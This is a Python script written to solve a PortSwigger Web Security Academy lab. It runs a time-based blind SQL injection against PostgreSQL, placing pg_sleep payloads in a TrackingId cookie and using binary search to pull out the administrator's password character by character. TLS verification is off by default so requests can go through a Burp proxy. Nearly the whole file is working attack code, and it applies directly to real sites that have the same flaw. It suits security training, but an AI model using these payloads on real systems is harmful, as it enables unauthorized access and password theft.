import os
import time

import requests
import urllib3


# ============================================================
# CONFIGURATION
# ============================================================

# Supply these values through environment variables.
#
# Linux/macOS:
#   export LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   export LAB_SESSION="YOUR_CURRENT_SESSION"
#   export TRACKING_PREFIX="YOUR_TRACKING_PREFIX"
#
# Windows PowerShell:
#   $env:LAB_URL="https://YOUR-LAB.web-security-academy.net/filter"
#   $env:LAB_SESSION="YOUR_CURRENT_SESSION"
#   $env:TRACKING_PREFIX="YOUR_TRACKING_PREFIX"

LAB_URL = os.getenv("LAB_URL")
SESSION = os.getenv("LAB_SESSION")
TRACKING_PREFIX = os.getenv("TRACKING_PREFIX")

# Characters ordered by PostgreSQL/ASCII ordering
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"

# Password length search range
MIN_LENGTH = 1
MAX_LENGTH = 64

# pg_sleep(3), so use a threshold comfortably below 3 seconds
TRUE_THRESHOLD = 2.0

# Burp Suite
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Keep the original behavior.
# TLS verification is disabled by default because the original
# script used verify=False and is designed to work with Burp.
#
# Set VERIFY_TLS=true when your certificate trust is configured.
VERIFY_TLS = os.getenv(
    "VERIFY_TLS",
    "false"
).lower() in {
    "1",
    "true",
    "yes",
    "on",
}


# ============================================================
# SETUP
# ============================================================

if not VERIFY_TLS:
    urllib3.disable_warnings(
        urllib3.exceptions.InsecureRequestWarning
    )

session = requests.Session()

session.proxies.update(PROXIES)

session.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": (
        "text/html,application/xhtml+xml,"
        "application/xml;q=0.9,*/*;q=0.8"
    ),
})


# ============================================================
# CONFIGURATION VALIDATION
# ============================================================

def validate_configuration():
    """
    Validate required runtime configuration before
    starting the SQL injection workflow.
    """

    missing = []

    if not LAB_URL:
        missing.append("LAB_URL")

    if not SESSION:
        missing.append("LAB_SESSION")

    if not TRACKING_PREFIX:
        missing.append("TRACKING_PREFIX")

    if missing:

        print("[!] Missing required environment variables:")

        for variable in missing:
            print(f"    - {variable}")

        print()
        print("[*] Example:")

        print(
            '    export LAB_URL='
            '"https://YOUR-LAB.web-security-academy.net/filter"'
        )

        print(
            '    export LAB_SESSION='
            '"YOUR_CURRENT_SESSION"'
        )

        print(
            '    export TRACKING_PREFIX='
            '"YOUR_TRACKING_PREFIX"'
        )

        return False

    return True


# ============================================================
# SEND REQUEST
# ============================================================

def send_request(tracking_id):

    try:

        start = time.perf_counter()

        response = session.get(
            LAB_URL,
            params={
                "category": "Lifestyle"
            },
            cookies={
                "TrackingId": tracking_id,
                "session": SESSION
            },
            verify=VERIFY_TLS,
            timeout=10
        )

        elapsed = time.perf_counter() - start

        return response, elapsed

    except requests.RequestException as error:

        print(f"[!] Request failed: {error}")

        return None, None


# ============================================================
# TIME-BASED TRUE/FALSE
#
# TRUE  -> pg_sleep(3)
# FALSE -> pg_sleep(0)
# ============================================================

def is_true(elapsed):

    return elapsed >= TRUE_THRESHOLD


# ============================================================
# FIND PASSWORD LENGTH
#
# Condition:
#
# LENGTH(password) > midpoint
#
# TRUE  -> pg_sleep(3)
# FALSE -> pg_sleep(0)
# ============================================================

def find_password_length():

    low = MIN_LENGTH
    high = MAX_LENGTH

    print()
    print("=" * 70)
    print("[*] Finding password length")
    print("=" * 70)

    while low < high:

        midpoint = (low + high) // 2

        tracking_id = (
            TRACKING_PREFIX
            + "' || (SELECT CASE WHEN "
            + "(LENGTH(password) > "
            + str(midpoint)
            + ") THEN pg_sleep(3) "
            + "ELSE pg_sleep(0) END "
            + "FROM users WHERE username='administrator') "
            + "IS NULL--"
        )

        response, elapsed = send_request(tracking_id)

        if elapsed is None:
            return None

        true = is_true(elapsed)

        print(
            f"[>] LENGTH(password) > {midpoint} "
            f"| {elapsed:.2f}s "
            f"| {'TRUE' if true else 'FALSE'}"
        )

        if true:

            # Password length is greater than midpoint
            low = midpoint + 1

        else:

            # Password length is <= midpoint
            high = midpoint

    print()
    print(f"[+] Password length = {low}")

    return low


# ============================================================
# TEST CHARACTER
#
# Condition:
#
# SUBSTRING(password,position,1) > 'midpoint'
#
# TRUE  -> pg_sleep(3)
# FALSE -> pg_sleep(0)
# ============================================================

def test_character_greater_than(position, midpoint_char):

    tracking_id = (
        TRACKING_PREFIX
        + "' || (SELECT CASE WHEN "
        + "(SUBSTRING(password,"
        + str(position)
        + ",1) > '"
        + midpoint_char
        + "') THEN pg_sleep(3) "
        + "ELSE pg_sleep(0) END "
        + "FROM users WHERE username='administrator') "
        + "IS NULL--"
    )

    response, elapsed = send_request(tracking_id)

    if elapsed is None:
        return None

    return is_true(elapsed), elapsed


# ============================================================
# FIND ONE CHARACTER
#
# Binary search over:
#
# 0123456789abcdefghijklmnopqrstuvwxyz
# ============================================================

def find_character(position):

    low = 0
    high = len(CHARSET) - 1

    print()
    print("-" * 70)
    print(f"[*] Finding character at position {position}")
    print("-" * 70)

    while low < high:

        mid = (low + high) // 2

        midpoint_char = CHARSET[mid]

        result, elapsed = test_character_greater_than(
            position,
            midpoint_char
        )

        if result is None:
            return None

        print(
            f"[>] password[{position}] > '{midpoint_char}' "
            f"| {elapsed:.2f}s "
            f"| {'TRUE' if result else 'FALSE'} "
            f"| range={low}-{high}"
        )

        if result:

            # Actual character is greater than midpoint
            low = mid + 1

        else:

            # Actual character is <= midpoint
            high = mid

    character = CHARSET[low]

    print(
        f"[+] Position {position} = '{character}'"
    )

    return character


# ============================================================
# EXTRACT PASSWORD
# ============================================================

def find_password(password_length):

    password = ""

    print()
    print("=" * 70)
    print("[*] Extracting administrator password")
    print(f"[*] Length: {password_length}")
    print("=" * 70)

    for position in range(1, password_length + 1):

        character = find_character(position)

        if character is None:

            print("[!] Extraction stopped.")

            return password

        password += character

        print()
        print(
            f"[+] Password so far: {password}"
        )
        print()

    return password


# ============================================================
# MAIN
# ============================================================

def main():

    if not validate_configuration():
        return

    print()
    print("=" * 70)
    print("PORTSWIGGER TIME-BASED BLIND SQLi")
    print("PostgreSQL pg_sleep() + Binary Search")
    print("=" * 70)

    print(f"[*] Target       : {LAB_URL}")
    print(f"[*] Charset      : {CHARSET}")
    print(f"[*] Sleep        : 3 seconds")
    print(f"[*] TRUE threshold: {TRUE_THRESHOLD}s")
    print(f"[*] Proxy        : 127.0.0.1:8080")
    print(
        f"[*] TLS          : "
        f"{'Verification enabled' if VERIFY_TLS else 'Verification disabled'}"
    )
    print()

    # ========================================================
    # PHASE 1
    # ========================================================

    password_length = find_password_length()

    if password_length is None:

        print(
            "[!] Could not determine password length."
        )

        return

    # ========================================================
    # PHASE 2
    # ========================================================

    password = find_password(password_length)

    # ========================================================
    # RESULT
    # ========================================================

    print()
    print("=" * 70)
    print(
        f"[+] PASSWORD LENGTH : {password_length}"
    )
    print(
        f"[+] ADMIN PASSWORD  : {password}"
    )
    print("=" * 70)


if __name__ == "__main__":
    main()